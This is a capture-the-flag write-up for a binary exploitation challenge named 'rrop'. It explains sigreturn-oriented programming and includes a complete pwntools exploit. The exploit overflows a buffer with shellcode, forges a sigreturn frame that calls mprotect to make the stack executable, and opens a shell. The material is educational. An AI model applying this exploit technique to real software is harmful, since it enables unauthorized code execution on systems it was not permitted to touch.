# Pwn Challenge

## Name: rrop

### Description:

`
 You came this far using Solar Designer technique and advance technique, now you are into the gr4n173 world where you can't win just with fake rope/structure but here you should fake the signal which is turing complete. 
`

**Author: gr4n173**

#### nc rrop.darkarmy.xyz 7001


**Solution:**

Main aim of this challenge was to make you familiar with `SIGROP` where you have to set up fake signal frames and initiate returns from signals that the kernel never really delivered. This is possible, because UNIX stores signal frames on the process’ stack.

Instead of storing the information in the kernel itself, it stores on the stack of process that is recipient of the signal. Prior to invoking the signal handler, kernel pushes (architecture-specific) variant of the (sigcontext) structure onto the process's stack which includes the register information etc. Hence when the signal handler completed it's job, it calls sigreturn which stores all the information on the stack and system call sets the values of all registers directly from the stack.

So in order to exploit the this challenge using `SIGROP/SGROP` we can make a call to `sigreturn` and create our desired set of registers. You can fake frame your self step by step but `pwntools` have a call function which will allow you to just setup the structure with the required register you want.

You set the desired set of registers using pwntools as shown below below.

```
#call the function from pwntools
frame = SigreturnFrame() 

#desired registers so that we can read/write the flag and print it.
#frame.rax = 0x1
frame.rax = constants.SYS_write
#frame.rdi = 0x1
frame.rdi = constants.STDOUT_FILENO
frame.rsi = flag_addr #writable addess
frame.rdx = 50 # just the random read which just print the text less than 50 characters
frame.rip = syscall #start the execution of the program from the label syscall
```


**Exploit:**

*At first:*
 You have to adjust the payload according to the shellcode required and then rax address was called( `0xf(syscall of sigreturn)`). 
 
*At second:*
Desired register were created by calling the `mprotect` so that we can use the shellcode we crafted before and the adjusting size of the stack frame.

```
from pwn import *

context.terminal= ['tmux', 'new-window']
context.arch= "amd64"
io = gdb.debug('./rrop')
#io = remote('34.126.91.169', 6003)
elf = ELF('./rrop')

shellcode = asm(shellcraft.amd64.linux.sh())

print(io.recvuntil('Buffer  @'))

leak_address = io.recvuntil(',').rstrip(',')
#print(leak_address)
shell_address = int(leak_address,16)
stack_address = int(leak_address[:11] + '000', 16)
#print(hex(stack_address))

log.info('Leak address ' + hex(shell_address))
log.info('Shell code : ' + hex(stack_address))

syscall     = 0x00000000004007d2 #0x000000000040053b
rax         = 0x00000000004007dc #0x0000000000400545
ret         = 0x00000000004007d4 #0x000000000040054a

offset      = 216

print(io.recvuntil('my process.\n'))

#Here you adjusted the payload according to the shellcode required and then we rax address was call to `0xf(syscall of sigreturn)`.
payload = shellcode
payload = payload.ljust(offset,'A')
payload += p64(rax) 
payload += p64(syscall)

# Here desired register were created by calling the mprotect so that we can use the shellcode we crafted before.

frame = SigreturnFrame()

frame.rax = 10
frame.rdi = stack_address
frame.rsi = 1000
frame.rdx = 7
frame.rsp = shell_address + len(payload) + 248
frame.rip = syscall

payload += str(frame)
payload += p64(shell_address)

io.sendline(payload)

io.interactive()
```



**Note:** If you want to learn more deep about `SIGROP` then you can read this research paper where this technique is explained in detail along it's use in real field of pwning.

[SIGROP Article Here](https://www.cs.vu.nl/~herbertb/papers/srop_sp14.pdf).
